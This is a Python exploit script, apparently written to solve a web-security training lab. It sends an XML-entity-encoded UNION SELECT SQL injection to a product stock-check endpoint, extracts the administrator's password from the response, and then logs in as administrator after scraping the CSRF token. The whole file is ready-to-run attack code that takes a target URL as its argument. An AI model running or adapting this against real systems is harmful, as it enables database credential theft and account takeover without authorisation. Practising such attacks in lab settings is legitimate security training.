import requests
import argparse
import re
import sys
from urllib.parse import urlparse
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the target's URL (eg: https://example.com)")
args = parser.parse_args()
input_url = args.url

endpoint = "/product/stock"
payload = "1 &#x55;NION &#x53;ELECT username || &apos;,&apos; || password FROM users"
req_body = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>{
    payload}</storeId></stockCheck>'


def get_endpoint(url, endpoint):
    # Extract the endpoint for the target URL
    url_parse = urlparse(url)
    endpoint = f"{url_parse.scheme}://{url_parse.netloc}{endpoint}"
    return endpoint


def exploit(url, endpoint, req_body):
    # Exploit the target URL to extract the administrator's password
    endpoint = get_endpoint(url, endpoint)
    try:
        response = requests.post(endpoint, data=req_body)
        response.raise_for_status()
    except requests.exceptions.ConnectionError:
        print(f"Connection error occurred\nCheck again if the host is up!!!")
        print("-"*50)
        print("Fail to exploit the target!!!")
        sys.exit(1)
    except requests.exceptions.HTTPError as http_err:
        print(f'The host responses with: "{
              http_err}"\nCheck again if the host is up!!!')
        print("-"*50)
        print("Fail to exploit the target!!!")
        sys.exit(1)

   # Extract and decode the XML response
    try:
        xml_data = response.content
        decoded_string = xml_data.decode("utf-8")
    except Exception as e:
        print(f"Error decoding response: {e}")
        print("-"*50)
        print("Fail to exploit the target!!!")
        sys.exit(1)

    # Extract the administrator's password using regex
    pattern = r'administrator,([^\n]+)\n'
    match = re.search(pattern, decoded_string)
    if match:
        return match.group(1)
    else:
        print("Failed to extract administrator password from response!!!")
        print("-"*50)
        print("Fail to exploit the target!!!")
        sys.exit(1)


def finish_lab(url, endpoint, req_body):
    # Get the admin password
    admin_password = exploit(url, endpoint, req_body)

    # Finish the lab by logging in as the administrator
    login_url = f"{url}/login"
    session = requests.Session()

    try:
        response = session.get(login_url)
        page_content = response.text
        response.raise_for_status()
    except requests.exceptions.RequestException as req_err:
        print(f"Request error occurred while fetching login page: {req_err}")
        return (None, None)

    # Extract CSRF token using BeautifulSoup
    try:
        bs = BeautifulSoup(page_content, "html.parser")
        csrf_token = bs.find("input", {"name": "csrf"}).get("value")
    except AttributeError as attr_err:
        print(f"Error extracting CSRF token: {attr_err}")
        return (None, None)

    # Attempt to log in as the administrator
    data = {'csrf': csrf_token, 'username': 'administrator',
            'password': admin_password}
    try:
        response = session.post(login_url, data=data)
        response.raise_for_status()
        return [response.status_code, admin_password]
    except requests.exceptions.RequestException as req_err:
        print(f"Request error occurred while logging in: {req_err}")
        return (None, None)


def main():
    print("Exploiting target...")
    print("-"*50)
    response = finish_lab(input_url, endpoint, req_body)
    if response[0] == 200:
        print(f"Endpoint: {get_endpoint(input_url, endpoint)}")
        print(f"Payload: {payload}")
        print(f"Admin Password: {response[1]}")
        print("-"*50)
        print("Exploiting Success!!!")
    else:
        print("-"*50)
        print("Fail to exploit the target!!!")


if __name__ == "__main__":
    main()
